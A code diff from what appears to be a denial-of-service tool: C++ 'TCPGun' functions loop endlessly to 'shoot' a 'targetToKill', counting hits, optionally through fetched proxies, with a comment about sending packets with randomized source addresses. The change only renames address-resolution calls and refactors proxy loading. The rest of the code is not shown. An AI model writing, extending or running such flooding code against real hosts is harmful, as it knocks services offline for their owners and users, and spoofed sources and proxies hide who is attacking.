@@ -29,12 +29,14 @@ bool TCPGun::FireWithoutProxy(const CURI &targetToKill, std::size_t &hitsCount) 
 {
 	// Checking connectivity over proxy, because packets would be send with randomized source
 
-	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, {})};
+	auto resolvedAddress{m_attacker.TryResolveAddress(targetToKill, {})};
 	while(!m_currentTask.ShouldStop())
 	{
+		// TODO: add error counter and optimize out
+		// so much adress resolving calls
 		if(resolvedAddress && ShootTarget(*resolvedAddress, hitsCount))
 		{
-			resolvedAddress = m_attacker.CheckConnection(targetToKill, {});
+			resolvedAddress = m_attacker.TryResolveAddress(targetToKill, {});
 		}
 	}
 	return false;
@@ -42,24 +44,18 @@ bool TCPGun::FireWithoutProxy(const CURI &targetToKill, std::size_t &hitsCount) 
 
 void TCPGun::FireWithProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
 {
-	Informator informer;
-	while(!m_currentTask.ShouldStop() &&
-		!informer.LoadNewData())
-	{
-	}
-
 	std::optional<std::vector<Proxy>> proxies;
 	while(!m_currentTask.ShouldStop() &&
-		!(proxies = informer.GetProxies()).has_value())
+		!(proxies = m_proxyGetter->GetProxies()).has_value())
 	{
 	}
 
 	// Checking connectivity over proxy, because packets would be send with randomized source
-	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, *proxies)};
+	auto resolvedAddress{m_attacker.TryResolveAddress(targetToKill, *proxies)};
 	while(!m_currentTask.ShouldStop() && resolvedAddress)
 	{
 		ShootTarget(*resolvedAddress, hitsCount);
-		resolvedAddress = m_attacker.CheckConnection(targetToKill, *proxies);
+		resolvedAddress = m_attacker.TryResolveAddress(targetToKill, *proxies);
 	}
 }
 
